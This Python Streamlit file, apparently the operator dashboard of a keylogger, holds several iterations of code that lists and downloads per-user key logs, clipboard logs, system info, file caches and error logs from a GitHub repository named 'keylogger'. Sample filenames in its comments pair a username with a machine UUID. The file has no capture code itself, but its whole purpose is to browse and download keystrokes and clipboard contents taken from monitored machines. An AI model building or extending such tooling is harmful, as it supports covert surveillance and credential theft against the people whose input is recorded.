# cache , config , keylogerror file content viewer

# import streamlit as st
# import requests
# import os
# import re

# # Load API key from environment variable
# GITHUB_API_KEY = "add_your_token_here"
# CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
# CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"

# # Function to fetch file list from GitHub
# def get_github_files(repo_url, file_extension):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if file['name'].endswith(file_extension)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames from filenames
# def extract_unique_users(file_list, pattern):
#     user_files = {}
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)
#             user_files[user_id] = file['download_url']  # Keep only the latest file for each user
    
#     return sorted(user_files.keys()), user_files

# # Function to fetch file content
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # Streamlit UI
# st.title("GitHub File Viewer")

# # Fetch files from both repositories
# cache_files = get_github_files(CACHE_REPO_URL, "_files_cache.json")
# config_files = get_github_files(CONFIG_REPO_URL, "_config.json")

# # Extract unique usernames separately
# cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
# config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")

# # Combine users and ensure uniqueness
# all_users = sorted(set(cache_users + config_users))
# all_users.insert(0, "All Users")  # Add option to select all users

# # Sidebar dropdown for user selection
# selected_user = st.sidebar.selectbox("Select User", all_users)
    
# # Show Cache Files
# st.subheader("Cache Files")
# filtered_cache_files = {k: v for k, v in cache_user_files.items() if selected_user == "All Users" or selected_user == k}

# for user, file_url in filtered_cache_files.items():
#     with st.expander(f"**{user}_files_cache.json**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"cache_{user}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Button to open full-screen content
#             if st.button(f"View {user} File in Fullscreen", key=f"cache_btn_{user}"):
#                 st.session_state["fullscreen_content"] = content
#                 st.session_state["fullscreen_user"] = user
#                 st.rerun()
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=f"{user}_files_cache.json", mime="application/json", key=f"cache_dl_{user}")

# # Show Config Files
# st.subheader("Config Files")
# filtered_config_files = {k: v for k, v in config_user_files.items() if selected_user == "All Users" or selected_user == k}

# for user, file_url in filtered_config_files.items():
#     with st.expander(f"**{user}_config.json**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"config_{user}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Button to open full-screen content
#             if st.button(f"View {user} File in Fullscreen", key=f"config_btn_{user}"):
#                 st.session_state["fullscreen_content"] = content
#                 st.session_state["fullscreen_user"] = user
#                 st.rerun()
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json", key=f"config_dl_{user}")

# # Fullscreen content view
# if "fullscreen_content" in st.session_state:
#     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
#     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")















# cache , config, keylogerror
import streamlit as st
import requests
import os
import re

# Load API key from environment variable
GITHUB_API_KEY = "add_your_token_here"
CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
KEYLOGERROR_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/keylogerror"

# Function to fetch file list from GitHub
def get_github_files(repo_url, file_extension):
    headers = {"Authorization": f"token {GITHUB_API_KEY}"}
    response = requests.get(repo_url, headers=headers)
    if response.status_code == 200:
        return [file for file in response.json() if file['name'].endswith(file_extension)]
    else:
        st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
        return []

# Function to extract unique usernames from filenames
def extract_unique_users(file_list, pattern):
    user_files = {}
    
    for file in file_list:
        filename = file['name']
        match = re.match(pattern, filename)
        if match:
            user_id = match.group(1)
            user_files[user_id] = file['download_url']  # Keep only the latest file for each user
    
    return sorted(user_files.keys()), user_files

# Function to fetch file content
def get_file_content(url):
    headers = {"Authorization": f"token {GITHUB_API_KEY}"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        st.error("Failed to fetch file content.")
        return None

# Streamlit UI
st.title("GitHub File Viewer")

# Fetch files from both repositories
cache_files = get_github_files(CACHE_REPO_URL, "_files_cache.json")
config_files = get_github_files(CONFIG_REPO_URL, "_config.json")
keylogerror_files = get_github_files(KEYLOGERROR_REPO_URL, "_keylogerror.log")

# Extract unique usernames separately
cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
keylogerror_users, keylogerror_user_files = extract_unique_users(keylogerror_files, r"(?:\d{8}_\d{6}_)?(.+?)_keylogerror\.log")

# Combine users and ensure uniqueness
all_users = sorted(set(cache_users + config_users + keylogerror_users))
all_users.insert(0, "All Users")  # Add option to select all users

# Sidebar dropdown for user selection
selected_user = st.sidebar.selectbox("Select User", all_users)
    
# Show Cache Files
st.subheader("Cache Files")
filtered_cache_files = {k: v for k, v in cache_user_files.items() if selected_user == "All Users" or selected_user == k}

for user, file_url in filtered_cache_files.items():
    with st.expander(f"**{user}_files_cache.json**: Show File Content"):
        content = get_file_content(file_url)
        if content:
            st.text_area("File Content", content, height=300, disabled=True, key=f"cache_{user}")
            
            st.write(f"[Open File Content]({file_url})")
            
            # Button to open full-screen content
            if st.button(f"View {user} File in Fullscreen", key=f"cache_btn_{user}"):
                st.session_state["fullscreen_content"] = content
                st.session_state["fullscreen_user"] = user
                st.rerun()
            
            # Provide file download option
            st.download_button(label="Download File", data=content, file_name=f"{user}_files_cache.json", mime="application/json", key=f"cache_dl_{user}")

# Show Config Files
st.subheader("Config Files")
filtered_config_files = {k: v for k, v in config_user_files.items() if selected_user == "All Users" or selected_user == k}

for user, file_url in filtered_config_files.items():
    with st.expander(f"**{user}_config.json**: Show File Content"):
        content = get_file_content(file_url)
        if content:
            st.text_area("File Content", content, height=300, disabled=True, key=f"config_{user}")
            
            st.write(f"[Open File Content]({file_url})")
            
            # Button to open full-screen content
            if st.button(f"View {user} File in Fullscreen", key=f"config_btn_{user}"):
                st.session_state["fullscreen_content"] = content
                st.session_state["fullscreen_user"] = user
                st.rerun()
            
            # Provide file download option
            st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json", key=f"config_dl_{user}")
            
# Show keylogerror Files
st.subheader("Keylogerror Files")
filtered_keylogerror_files = {k: v for k, v in keylogerror_user_files.items() if selected_user == "All Users" or selected_user == k}

for user, file_url in filtered_keylogerror_files.items():
    with st.expander(f"**{user}_keylogerror.log**: Show File Content"):
        content = get_file_content(file_url)
        if content:
            st.text_area("File Content", content, height=300, disabled=True, key=f"keylogerror_{user}")
            
            st.write(f"[Open File Content]({file_url})")
            
            # Button to open full-screen content
            if st.button(f"View {user} File in Fullscreen", key=f"keylogerror_btn_{user}"):
                st.session_state["fullscreen_content"] = content
                st.session_state["fullscreen_user"] = user
                st.rerun()
            
            # Provide file download option
            st.download_button(label="Download File", data=content, file_name=f"{user}_keylogerror.log", mime="application/log", key=f"keylogerror_dl_{user}")

# Fullscreen content view
if "fullscreen_content" in st.session_state:
    st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
    st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")











# 20250208_215250_bibek_4C4C4544-0033-3910-804A-B3C04F324233_key_log.txt 
# 20250208_215344_bibek_4C4C4544-0033-3910-804A-B3C04F324233_clipboard_log.txt 
# 20250208_215344_bibek_4C4C4544-0033-3910-804A-B3C04F324233_system_info.json
# logs 

# import streamlit as st
# import requests
# import os
# import re

# # Load API key from environment variable
# GITHUB_API_KEY = "add_your_token_here"


# CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
# CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
# LOGS_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"

# # Function to fetch file list from GitHub
# def get_github_files(repo_url, file_extensions):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if any(file['name'].endswith(ext) for ext in file_extensions)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames and their latest corresponding files
# def extract_unique_users(file_list, pattern, is_log=False):
#     user_files = {}
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)
#             file_type = match.group(2) if is_log else "default"
#             key = f"{user_id}_{file_type}"  # Ensure uniqueness for each user and file type
#             if key not in user_files:
#                 user_files[key] = (filename, file['download_url'])  # Keep only the first occurrence per user per file type
    
#     return sorted(set(k.split('_')[0] for k in user_files.keys())), user_files

# # Function to fetch file content
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # Streamlit UI
# st.title("GitHub File Viewer")

# # Fetch files from all repositories
# cache_files = get_github_files(CACHE_REPO_URL, ["_files_cache.json"])
# config_files = get_github_files(CONFIG_REPO_URL, ["_config.json"])
# logs_files = get_github_files(LOGS_REPO_URL, ["_key_log.txt", "_clipboard_log.txt", "_system_info.json"])

# # Extract unique usernames separately
# cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
# config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
# logs_users, logs_user_files = extract_unique_users(logs_files, r"(?:\d{8}_\d{6}_)?(.+?)_([^_]+\.txt|[^_]+\.json)", is_log=True)

# # Combine users and ensure uniqueness
# all_users = sorted(set(cache_users + config_users + logs_users))
# all_users.insert(0, "All Users")  # Add option to select all users

# # Sidebar dropdown for user selection
# selected_user = st.sidebar.selectbox("Select User", all_users)

    
# # Show Logs Files
# st.subheader("Logs Files")
# filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}

# for key, (filename, file_url) in filtered_logs_files.items():
#     with st.expander(f"**{filename}**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")

# # Fullscreen content view
# if "fullscreen_content" in st.session_state:
#     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
#     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")















# logs with sidebar unique username issue

# import streamlit as st
# import requests
# import os
# import re

# # Load API key from environment variable
# GITHUB_API_KEY = "add_your_token_here"
# CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
# CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
# LOGS_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"

# # Function to fetch file list from GitHub
# def get_github_files(repo_url, file_extensions):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if any(file['name'].endswith(ext) for ext in file_extensions)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames and their corresponding files
# def extract_unique_users(file_list, pattern, is_log=False):
#     user_files = {}
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)  # Extract unique username
#             file_type = match.group(2) if is_log else "default"
#             key = f"{user_id}_{file_type}"  # Ensure uniqueness for each user and file type
#             if key not in user_files:
#                 user_files[key] = (f"{user_id}_{file_type}", file['download_url'])  # Store without date_time prefix
    
#     return sorted(set(k.split('_')[0] for k in user_files.keys())), user_files

# # Function to fetch file content
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # Streamlit UI
# st.title("GitHub File Viewer")

# # Fetch files from all repositories
# cache_files = get_github_files(CACHE_REPO_URL, ["_files_cache.json"])
# config_files = get_github_files(CONFIG_REPO_URL, ["_config.json"])
# logs_files = get_github_files(LOGS_REPO_URL, ["_key_log.txt", "_clipboard_log.txt", "_system_info.json"])

# # Extract unique usernames separately
# cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
# config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
# logs_users, logs_user_files = extract_unique_users(logs_files, r"(?:\d{8}_\d{6}_)?(.+?)_([^_]+\.txt|[^_]+\.json)", is_log=True)

# # Combine users and ensure uniqueness
# all_users = sorted(set(cache_users + config_users + logs_users))
# all_users.insert(0, "All Users")  # Add option to select all users

# # Sidebar dropdown for user selection
# selected_user = st.sidebar.selectbox("Select User", all_users)
    
# # Show Logs Files
# st.subheader("Logs Files")
# filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}

# for key, (filename, file_url) in filtered_logs_files.items():
#     with st.expander(f"**{filename}**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")

# # Fullscreen content view
# if "fullscreen_content" in st.session_state:
#     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
#     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")















# # side bar name adjusted need to be modified more
# import streamlit as st
# import requests
# import os
# import re

# # Load API key from environment variable
# GITHUB_API_KEY = "add_your_token_here"
# CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
# CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
# LOGS_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"

# # Function to fetch file list from GitHub
# def get_github_files(repo_url, file_extensions):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if any(file['name'].endswith(ext) for ext in file_extensions)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames and their corresponding files
# def extract_unique_users(file_list, pattern, is_log=False):
#     user_files = {}
#     unique_users = set()
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)  # Extract unique username
#             unique_users.add(user_id)
#             file_type = match.group(2) if is_log else "default"
#             key = f"{user_id}_{file_type}"  # Ensure uniqueness for each user and file type
#             if key not in user_files:
#                 user_files[key] = (f"{user_id}_{file_type}", file['download_url'])  # Store without date_time prefix
    
#     return sorted(unique_users), user_files

# # Function to fetch file content
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # Streamlit UI
# st.title("GitHub File Viewer")

# # Fetch files from all repositories
# cache_files = get_github_files(CACHE_REPO_URL, ["_files_cache.json"])
# config_files = get_github_files(CONFIG_REPO_URL, ["_config.json"])
# logs_files = get_github_files(LOGS_REPO_URL, ["_key_log.txt", "_clipboard_log.txt", "_system_info.json"])

# # Extract unique usernames separately
# cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
# config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
# logs_users, logs_user_files = extract_unique_users(logs_files, r"(?:\d{8}_\d{6}_)?(.+?)_([^_]+\.txt|[^_]+\.json)", is_log=True)

# # Combine users and ensure uniqueness
# all_users = sorted(set(cache_users + config_users + logs_users))
# all_users.insert(0, "All Users")  # Add option to select all users

# # Sidebar dropdown for user selection
# selected_user = st.sidebar.selectbox("Select User", all_users)
    
# # Show Logs Files
# st.subheader("Logs Files")
# filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}

# for key, (filename, file_url) in filtered_logs_files.items():
#     with st.expander(f"**{filename}**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")

# # Fullscreen content view
# if "fullscreen_content" in st.session_state:
#     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
#     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")














# mininmize side bar duplicate

# import streamlit as st
# import requests
# import os
# import re

# # Load API key from environment variable
# GITHUB_API_KEY = "add_your_token_here"
# CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/cache"
# CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
# LOGS_REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"

# # Function to fetch file list from GitHub
# def get_github_files(repo_url, file_extensions):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if any(file['name'].endswith(ext) for ext in file_extensions)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames and their corresponding files
# def extract_unique_users(file_list, pattern, is_log=False):
#     user_files = {}
#     unique_users = set()
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)  # Extract unique username
#             unique_users.add(user_id)  # Store only the unique username
#             file_type = match.group(2) if is_log else "default"
#             key = f"{user_id}_{file_type}"  # Ensure uniqueness for each user and file type
#             if key not in user_files:
#                 user_files[key] = (filename, file['download_url'])  # Store without date_time prefix
    
#     return sorted(unique_users), user_files

# # Function to fetch file content
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_API_KEY}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # Streamlit UI
# st.title("GitHub File Viewer")

# # Fetch files from all repositories
# cache_files = get_github_files(CACHE_REPO_URL, ["_files_cache.json"])
# config_files = get_github_files(CONFIG_REPO_URL, ["_config.json"])
# logs_files = get_github_files(LOGS_REPO_URL, ["_key_log.txt", "_clipboard_log.txt", "_system_info.json"])

# # Extract unique usernames separately
# cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
# config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
# logs_users, logs_user_files = extract_unique_users(logs_files, r"(?:\d{8}_\d{6}_)?(.+?)_([^_]+\.txt|[^_]+\.json)", is_log=True)

# # Ensure unique usernames without duplicates from log file types
# logs_users = sorted(set(user.split("_")[0] for user in logs_users))

# # Combine users and ensure uniqueness
# all_users = sorted(set(cache_users + config_users + logs_users))
# all_users.insert(0, "All Users")  # Add option to select all users

# # Sidebar dropdown for user selection
# selected_user = st.sidebar.selectbox("Select User", all_users)
    
# # Show Logs Files
# st.subheader("Logs Files")
# filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}

# for key, (filename, file_url) in filtered_logs_files.items():
#     with st.expander(f"**{filename}**: Show File Content"):
#         content = get_file_content(file_url)
#         if content:
#             st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
            
#             st.write(f"[Open File Content]({file_url})")
            
#             # Provide file download option
#             st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")

# # Fullscreen content view
# if "fullscreen_content" in st.session_state:
#     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
#     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")
